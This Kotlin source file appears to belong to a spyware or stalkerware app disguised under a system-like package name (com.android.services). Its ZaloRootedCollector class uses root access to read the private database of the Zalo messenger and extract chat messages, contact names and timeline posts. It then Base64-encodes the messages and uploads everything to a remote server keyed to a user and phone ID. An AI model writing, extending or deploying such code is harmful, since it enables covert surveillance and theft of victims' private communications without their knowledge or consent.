package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.services.db.entities.ZaloMessageRooted
import com.android.services.db.entities.ZaloPostRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.ZaloUpload
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.setPermissionZalo
import com.android.services.util.logException
import com.android.services.util.logVerbose
import org.json.JSONObject
import java.util.*

class ZaloRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncZalo) {
            try {
                val zaloUpload: ZaloUpload? =
                    queryZaloMessagesAndPosts(context, localDatabaseSource)
                if (zaloUpload != null) {
                    val zaloMessages = zaloUpload.zaloMessageList
                    val zaloPosts = zaloUpload.zaloPostList
                    var startDate: Date? = null
                    var endDate: Date? = null
                    if (zaloMessages.isNotEmpty()) {
                        startDate = zaloMessages[zaloMessages.size - 1].date
                        endDate = zaloMessages[0].date
                    }
                    val mZaloSender = RemoteServerHelper(
                        context,
                        AppConstants.ZALO_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mZaloSender.upload(zaloMessages, zaloPosts)
                } else {
                    logVerbose(
                        "${AppConstants.ZALO_ROOTED_TYPE} No Logs found",
                        AppConstants.ZALO_ROOTED_TYPE
                    )
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.ZALO_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.ZALO_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {

        private const val zaloFolder = "com.zing.zalo"
        private const val zaloDB = "zalo_x_1.db"

        private fun queryZaloMessagesAndPosts(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): ZaloUpload? {

            val ZaloUpload = ZaloUpload()
            var zaloMessageList = ArrayList<ZaloMessageRooted>()
            var zaloPostList = ArrayList<ZaloPostRooted>()
            try {
                setPermissionZalo()
                val zaloDatabase = ("/data/data/"
                        + zaloFolder
                        + "/databases/"
                        + zaloDB)

                val database =
                    SQLiteDatabase.openDatabase(zaloDatabase, null, SQLiteDatabase.OPEN_READONLY)
                val selection: String?
                val selectionArgs: Array<String>?
                val since: String
                val maxTimeStamp = localDatabaseSource.selectZaloMessageRootedMaxTimeStamp() ?: "0"
                since = maxTimeStamp.toString()

                if (since.isNotEmpty()) {
                    selection = String.format("%s > ?", "timestamp")
                    selectionArgs = arrayOf(since)
                } else {
                    selection = null
                    selectionArgs = null
                }

                val cursor = database.query("chat_content",
                    null,
                    selection,
                    selectionArgs,
                    null,
                    null,
                    "timestamp DESC")

                while (cursor.moveToNext()) {
                    try {
                        val timeStamp = cursor.getString(cursor.getColumnIndex("timestamp"))
                        val senderId = cursor.getString(cursor.getColumnIndex("senderUid"))
                        val ownerId = cursor.getString(cursor.getColumnIndex("ownerId"))
                        val currentUser = cursor.getString(cursor.getColumnIndex("currentUserUid"))
                        var senderName: String? = ""
                        if (currentUser == senderId) {
                            val rc = database.query("contact_profile_5", arrayOf("dpn"),
                                "uid=?", arrayOf(senderId), null, null, null)
                            if (rc.moveToFirst()) {
                                senderName = rc.getString(0)
                            }
                            rc.close()
                        } else {
                            senderName = cursor.getString(cursor.getColumnIndex("senderName"))
                        }

                        val message = cursor.getString(cursor.getColumnIndex("message"))
                        val type = if (currentUser == senderId) "outgoing" else "incoming"

                        val zaloMessageRooted = ZaloMessageRooted()
                        zaloMessageRooted.apply {
                            this.messageId = timeStamp
                            this.conversationId = currentUser + ownerId
                            this.conversationName = senderName ?: ""
                            this.message = AppUtils.convertStringToBase64(message)
                            this.type = type
                            this.messageDatetime = AppUtils.formatDate(timeStamp)
                            this.timeStamp = timeStamp.toLong()
                            this.date = AppUtils.getDate(timeStamp.toLong())
                        }
                        zaloMessageList.add(zaloMessageRooted)
                    } catch (e: Exception) {
                        logVerbose(
                            "${AppConstants.ZALO_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                            throwable = e
                        )
                    }
                }
                cursor.close()

                logVerbose("${AppConstants.ZALO_ROOTED_TYPE} rooted messages list = $zaloMessageList")
                if (zaloMessageList.isNotEmpty())
                    localDatabaseSource.insertZaloMessageRooted(zaloMessageList)
                localDatabaseSource.selectZaloMessageRooted {
                    zaloMessageList = it as ArrayList<ZaloMessageRooted>
                }
                logVerbose("${AppConstants.ZALO_ROOTED_TYPE} selected messages list = $zaloMessageList")

                var maxPostTimeStamp = localDatabaseSource.selectZaloPostRootedMaxTimeStamp()
                if (maxPostTimeStamp == null) {
                    maxPostTimeStamp = 0L
                }
                val postCursor =
                    database.query("timeline_feed_1", null, null, null, null, null, null)
                while (postCursor.moveToNext()) {
                    try {
                        val data = postCursor.getString(postCursor.getColumnIndex("content"))
                        if (data != null) {
                            val zaloPost = JSONObject(data)
                            val item = zaloPost.getJSONObject("item")
                            val timeStamp = item.getString("cts")
                            if (timeStamp.toLong() > maxPostTimeStamp) {
                                val postId = item.getString("fid")
                                val header = item.getJSONObject("header")
                                val userName = header.getString("dpn")
                                val profileUrl = header.getString("avt")
                                val content = item.getJSONObject("content")
                                val photo = content.getJSONObject("photo")
                                val postUrl = photo.getString("origin")
                                val caption = content.getString("caption")
                                val footer = item.getJSONObject("footer")
                                val likes = footer.getString("numlike")


                                val zaloPostRooted = ZaloPostRooted()
                                zaloPostRooted.apply {
                                    this.postId = postId
                                    this.username = userName
                                    this.postUrl = postUrl
                                    this.caption = caption
                                    this.likes = likes
                                    this.userProfileUrl = profileUrl
                                    this.messageDatetime = AppUtils.formatTime(timeStamp)
                                    this.timeStamp = timeStamp.toLong()
                                }
                                zaloPostList.add(zaloPostRooted)
                            }
                        }
                    } catch (e: Exception) {
                        logException(
                            "${AppConstants.ZALO_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                            throwable = e
                        )
                    }
                }
                postCursor.close()
                database.close()

                logVerbose("${AppConstants.ZALO_ROOTED_TYPE} rooted post list = $zaloPostList")
                if (zaloPostList.isNotEmpty())
                    localDatabaseSource.insertZaloPostRooted(zaloPostList)
                localDatabaseSource.selectZaloPostRooted {
                    zaloPostList = it as ArrayList<ZaloPostRooted>
                }
                logVerbose("${AppConstants.ZALO_ROOTED_TYPE} selected post list = $zaloPostList")

                return if (zaloMessageList.size > 0 || zaloPostList.size > 0) {
                    ZaloUpload(AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        zaloPostList.toList(),
                        zaloMessageList.toList())
                } else {
                    null
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.ZALO_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return ZaloUpload
        }
    }
}